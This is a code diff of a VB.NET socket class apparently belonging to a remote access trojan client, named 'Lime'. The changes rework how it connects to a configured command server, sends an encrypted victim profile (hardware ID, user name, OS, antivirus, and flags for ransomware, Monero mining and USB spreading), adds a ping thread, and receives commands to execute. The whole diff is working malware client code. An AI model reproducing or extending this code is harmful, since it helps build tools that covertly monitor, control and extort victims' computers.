@@ -1,29 +1,12 @@
 ﻿Namespace Lime
 
     Public Class C_Socket
-        Public Shared KEY As String = C_Settings.KEY
+        Public Shared ENDOF As String = C_Settings.ENDOF
         Public Shared SPL As String = C_Settings.SPL
         Public Shared C As Net.Sockets.TcpClient
         Public Shared R As New Random
         Public Shared T1 As New Threading.Thread(AddressOf Connect)
         Public Shared CNT As Boolean = False
-
-        Public Shared Sub SendData(ByVal b As Byte())
-            If CNT = False Then Exit Sub
-            Try
-                Dim r As Object = New IO.MemoryStream
-                r.Write(b, 0, b.Length)
-                r.Write(SB(KEY), 0, KEY.Length)
-                C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
-                r.Dispose()
-            Catch ex As Exception
-                CNT = False
-            End Try
-        End Sub
-
-        Public Shared Sub Send(ByVal S As String)
-            SendData(SB(C_Encryption.AES_Encrypt(S)))
-        End Sub
 
         Public Shared Sub Connect()
             Dim MS As New IO.MemoryStream ' create memory stream
@@ -44,8 +27,8 @@ re:
                     C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                     MS.Write(B, 0, B.Length)
 rr:
-                    If BS(MS.ToArray).Contains(KEY) Then ' split packet..
-                        Dim A As Array = SplitWord(MS.ToArray, KEY)
+                    If BS(MS.ToArray).Contains(ENDOF) Then ' split packet..
+                        Dim A As Array = SplitWord(MS.ToArray, ENDOF)
                         Dim T As New Threading.Thread(AddressOf C_Commands.Data)
                         T.Start(A(0))
                         MS.Dispose()
@@ -59,7 +42,7 @@ rr:
             Catch ex As Exception
                 GoTo e
             End Try
-            Threading.Thread.CurrentThread.Sleep(1)
+            Threading.Thread.Sleep(1)
             GoTo re
 e:      ' clear things and ReConnect
             CNT = False
@@ -74,10 +57,10 @@ e:      ' clear things and ReConnect
             MS = New IO.MemoryStream
             Try
                 C = New Net.Sockets.TcpClient
+                C.SendBufferSize = 999999
+                C.ReceiveBufferSize = 999999
                 C.ReceiveTimeout = -1
                 C.SendTimeout = -1
-                C.SendBufferSize = 9999999
-                C.ReceiveBufferSize = 9999999
 
                 KA = 0
 #If DEBUG Then
@@ -97,12 +80,52 @@ e:      ' clear things and ReConnect
                 C.Client.Connect(C_Settings.HOST, C_Settings.PORT)
                 CNT = True
                 'Send info to server
-                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.1", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
-                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, " ", SPL, " "))
+                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.2F", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
+                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, "...", SPL, " "))
+                Dim P As New Threading.Thread(AddressOf PING)
+                P.Start()
             Catch ex As Exception
-                Threading.Thread.CurrentThread.Sleep(R.Next(5000))
+                Threading.Thread.Sleep(R.Next(5000))
                 GoTo e
             End Try
+            GoTo re
+        End Sub
+
+        Public Shared Sub SendData(ByVal b As Byte())
+            If CNT = False Then Exit Sub
+            Try
+                Dim r As Object = New IO.MemoryStream
+                r.Write(b, 0, b.Length)
+                r.Write(SB(ENDOF), 0, ENDOF.Length)
+                C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
+                r.Dispose()
+            Catch ex As Exception
+                CNT = False
+            End Try
+        End Sub
+
+        Public Shared Sub Send(ByVal S As String)
+            SendData(SB(C_Encryption.AES_Encrypt(S)))
+        End Sub
+
+        Public Shared _stop As Boolean = False
+        Public Shared _start As Boolean = False
+        Public Shared MS As Integer = 0
+        Public Shared Sub PING(sock As Integer)
+re:
+            Try
+                If CNT = False Then MS = 0 : Exit Sub
+                If _start Then
+                    MS += 1
+                    If _stop Then
+                        Send("!P" + SPL + MS.ToString)
+                        MS = 0
+                        _start = False
+                        _stop = False
+                    End If
+                End If
+                    Threading.Thread.Sleep(1)
+            Catch : End Try
             GoTo re
         End Sub
 
